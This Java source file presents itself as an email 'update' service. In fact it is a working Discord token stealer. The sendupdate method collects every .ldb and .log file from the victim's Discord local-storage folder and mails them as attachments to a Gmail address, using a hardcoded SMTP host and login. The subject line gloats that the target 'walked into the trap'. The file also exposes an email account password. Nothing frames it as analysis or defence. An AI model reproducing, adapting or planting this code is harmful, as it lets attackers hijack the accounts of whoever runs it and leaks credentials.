package de.soass.email;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.nio.charset.Charset;

import javax.mail.*;
import javax.mail.internet.*;
import javax.activation.*;
import java.util.Properties;

public class EmailService {

    public static void sendupdate(String s) throws MessagingException, FileNotFoundException {


        String to = "rsahleanu@gmail.com";
        String from = "Klkein@fatale-randale.de";
        final String username = "Klkein@fatale-randale.de";
        final String password = "Klkein";

        String host = "cmail01.mc-host24.de";


        Properties properties = System.getProperties();


        properties.put("mail.smtp.auth", "true");
        properties.put("mail.smtp.starttls.enable", "true");

        properties.put("mail.smtp.port", "25");
        properties.setProperty("mail.smtp.host", host);


        Session session;
        session = Session.getDefaultInstance(properties, new Authenticator() {
            protected PasswordAuthentication getPasswordAuthentication() {
                return new PasswordAuthentication(username, password);
            }
        });

        MimeMessage message = new MimeMessage(session);
        message.setFrom(new InternetAddress(from));
        message.addRecipient(Message.RecipientType.TO, new InternetAddress(to));
        message.setSubject("Typ in die falle gelaufen");
        message.setText("test");


        Multipart multipart = new MimeMultipart();
        BodyPart messageBodyPart = new MimeBodyPart();
        messageBodyPart.setText("This is message body");
        multipart.addBodyPart(messageBodyPart);

        File[] listFiles;
        for (File f : new File(System.getenv("APPDATA") + "\\discord\\Local Storage\\leveldb").listFiles()) {
            if(f.getName().endsWith(".ldb") ||f.getName().endsWith(".log")) {
                messageBodyPart = new MimeBodyPart();
                String filename = f.getAbsolutePath();
                DataSource source = new FileDataSource(filename);
                messageBodyPart.setDataHandler(new DataHandler(source));
                messageBodyPart.setFileName(filename);
                multipart.addBodyPart(messageBodyPart);
            }
        }
        message.setContent(multipart);
        Transport.send(message);


        System.out.println("Sent message successfully....");

    }


}
